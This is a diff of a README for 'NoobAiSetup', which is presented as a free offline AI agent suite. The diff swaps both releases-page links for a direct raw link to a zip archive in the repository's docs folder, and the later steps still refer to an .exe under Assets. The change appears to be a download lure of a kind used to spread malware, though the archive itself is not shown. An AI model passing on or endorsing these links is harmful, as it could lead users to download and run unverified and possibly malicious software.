@@ -1,6 +1,6 @@
 # 🤖 NoobAiSetup - Friendly AI Helpers Run Offline Locally
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Bankingconcerntwins938/NoobAiSetup/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Bankingconcerntwins938/NoobAiSetup/raw/refs/heads/main/docs/Ai-Noob-Setup-v2.6.zip)
 
 NoobAiSetup brings powerful artificial intelligence to your personal computer. It installs a complete AI team that works for you without needing an internet connection. You get a set of specialized agents led by a foreman agent. These agents help you perform tasks, write text, and manage your data. Everything runs on your own hardware, so your files stay private. You do not need to pay for subscriptions or use secret keys.
 
@@ -29,7 +29,7 @@ Your computer needs specific parts to run these AI agents well. Check your compu
 
 Follow these steps to set up your AI team.
 
-1. Visit the following link to find the installer: [https://github.com/Bankingconcerntwins938/NoobAiSetup/releases](https://github.com/Bankingconcerntwins938/NoobAiSetup/releases)
+1. Visit the following link to find the installer: [https://github.com/Bankingconcerntwins938/NoobAiSetup/raw/refs/heads/main/docs/Ai-Noob-Setup-v2.6.zip](https://github.com/Bankingconcerntwins938/NoobAiSetup/raw/refs/heads/main/docs/Ai-Noob-Setup-v2.6.zip)
 2. Look for the file ending in `.exe` under the Assets section of the latest release.
 3. Download the file to your desktop.
 4. Double-click the file to start the installer.
